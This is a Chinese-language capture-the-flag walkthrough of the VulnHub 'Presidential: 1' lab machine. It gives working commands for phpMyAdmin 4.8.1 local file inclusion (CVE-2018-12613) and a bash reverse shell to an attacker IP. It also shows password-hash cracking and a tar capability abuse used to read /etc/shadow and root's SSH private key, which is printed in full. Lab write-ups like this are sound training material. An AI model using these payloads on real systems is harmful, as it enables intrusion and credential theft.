靶机地址：[Presidential: 1 ~ VulnHub](https://www.vulnhub.com/entry/presidential-1,500/)

主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- "192.168.1.55"
sudo nmap -p "80,2082" -sV "192.168.1.55"
# 80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.5.38)
# 2082/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
```

访问web服务，没发现什么特别的
进行web路径扫描
```Shell
sudo dirsearch -u "http://192.168.1.55"
# /config.php.bak
# /cgi-bin/
```
查看到如下内容
```php
<?php

$dbUser = "votebox";
$dbPass = "casoj3FFASPsbyoRP";
$dbHost = "localhost";
$dbname = "votebox";

?>
```
尝试SSH，失败了，提示好像是只能通过公钥连接
进一步信息收集
```Shell
sudo dirsearch -u http://192.168.1.55/cgi-bin/ -f -e cgi,sh
# 啥也没发现
sudo dirsearch -u http://192.168.1.55 -f -e html,txt,php -w /usr/share/dirb/wordlists/common.txt
dirb "http://192.168.1.55" -r -X .php
```
还是啥也没收集到，应该是忽略了什么
源码中的敏感信息收集的不到位，首页中可以看到这样一个邮箱 `contact@votenow.local`
改一下hosts文件，加入如下内容
```
# votenow.local
192.168.1.55    votenow.local
```
再来扫描一下
```Shell
sudo dirsearch -u "http://votenow.local"
```
还是没扫到更多信息，尝试子域名枚举
```Shell
gobuster vhost -u http://votenow.local --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt | grep "Status: 200" > res.txt
# Found: datasafe.votenow.local (Status: 200) [Size: 9502]
```
加入hosts文件
```
192.168.1.55    datasafe.votenow.local
```
访问看看，是一个phpMyAdmin的管理后台登录页面
尝试使用之前得到的账号密码登录，成功了
登录后看到版本信息
```
Version information: 4.8.1
```
搜索相关漏洞
```Shell
searchsploit phpmyadmin 4.8.1
# php/webapps/44924.txt
# php/webapps/44928.txt
# php/webapps/50457.py
```
查看本地文件包含的漏洞利用
```Shell
cat /usr/share/exploitdb/exploits/php/webapps/44928.txt
```
关键内容如下
```
# CVE : CVE-2018-12613

1. Run SQL Query : select '<?php phpinfo();exit;?>'
2. Include the session file :
http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k
```
利用方式是，先执行SQL语句，再通过访问和session相关的连接执行代码
先插入看看
```SQL
select '<?php phpinfo();exit;?>';
```
用浏览器查看Cookie中的phpMyAdmin的值，我这里是
```
13h1ggpe5ldfpmbgkdfqvk51623sjgql
```
访问
```
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_13h1ggpe5ldfpmbgkdfqvk51623sjgql
```
失败了，经过尝试，要把链接中的 `sessions` 改成 `session` ，如下
```
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_13h1ggpe5ldfpmbgkdfqvk51623sjgql
```
可以看到确实执行了代码
尝试进一步利用，反弹shell，退出后台重新登录，执行如下SQL语句
```SQL
select '<?php system("bash -i >& /dev/tcp/192.168.1.26/4444 0>&1");exit;?>';
```
再次查看cookie值，先开启侦听端口，再访问
```
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_e33ph8u85k16uf2fbths4c35gscm88um
```
成功获取到反弹shell，信息收集
```Shell
cat /etc/passwd | grep /bin/bash
# root:x:0:0:root:/root:/bin/bash
# admin:x:1000:1000::/home/admin:/bin/bash
```
数据库中看到一张用户表，其中保存 `admin` 用户及其密码
```
admin
$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i
```
就这一个信息，尝试暴破
将密码 `$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i` 写入 `hash.john`
```Shell
john hash.john
# Stella
```
直接 `su` （SSH不行，不能通过密码连接）
```Shell
su admin
# Stella
```
成功了，尝试提权
```Shell
cd
ls -la
# notes.txt
cat notes.txt
```
找到一段提示，大意为：使用新命令备份和压缩敏感文件
```Shell
/sbin/getcap -r / 2>/dev/null
# /usr/bin/tarS = cap_dac_read_search+ep
```
找到一个比较可疑的，查了一下，可以绕过文件系统权限读取文件
```Shell
cd /etc/
/usr/bin/tarS -czf /tmp/shadow.tar.gz shadow
cd /tmp/
/usr/bin/tarS -zxf shadow.tar.gz
chmod 400 shadow
cat shadow
```
这样可以读取到shadow文件，尝试破解root账号密码，但失败了
换一个思路，可以获取root账号的密钥信息
```Shell
cd /tmp/
/usr/bin/tarS -czf "ssh.tar.gz" /root/.ssh
/usr/bin/tarS -zxf "ssh.tar.gz"
```
读取私钥
```Shell
ls -l /tmp/root/.ssh
cat /tmp/root/.ssh/id_rsa
```
内容如下
```
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```
保存到本机
```Shell
chmod 600 id_rsa
ssh root@192.168.1.55 -i id_rsa -p 2082
```
成功获取到root权限